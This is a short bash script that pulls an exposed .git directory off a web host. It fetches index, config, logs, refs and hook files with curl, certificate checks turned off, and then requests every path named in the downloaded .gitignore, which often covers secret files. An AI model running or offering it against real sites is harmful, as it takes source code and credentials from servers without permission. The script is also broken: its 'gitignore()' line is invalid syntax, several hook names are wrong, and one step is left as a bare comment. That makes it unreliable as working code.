
#!/bin/bash -li

# Constants.
files=(
    README.md
    .gitignore
    .git/description
    .git/index
    .git/config
    .git/COMMIT_EDITMSG
    .git/FETCH_HEAD
    .git/HEAD
    .git/packed-refs
    .git/logs/HEAD
    .git/info/exclude
    .git/hooks/applypatch-msg
    .git/hooks/commit-msg
    .git/hooks/fsmonitor-watchman-msg
    .git/hooks/pre-applypatch-msg
    .git/hooks/pre-commit
    .git/hooks/pre-push-msg
    .git/hooks/pre-rebase-msg
    .git/hooks/pre-receive-msg
    .git/hooks/pre-commit-msg
    .git/hooks/update
)

# Args.
host="$1"

# Methods.
main () {
    mkdir -p .git/logs
    mkdir -p .git/hooks
    mkdir -p .git/info
    for f in ${files[@]}; do
        curl -k $host/$f > $f
    done

    # Extract from .gitignore.
    gitignore()

    # Clean up index into index.clean.
}

gitignore () {
    cat .gitignore | grep -vE '^#|^$|\*' | while read f; do curl -k $host/$f > $f;done
}

# Run.
main
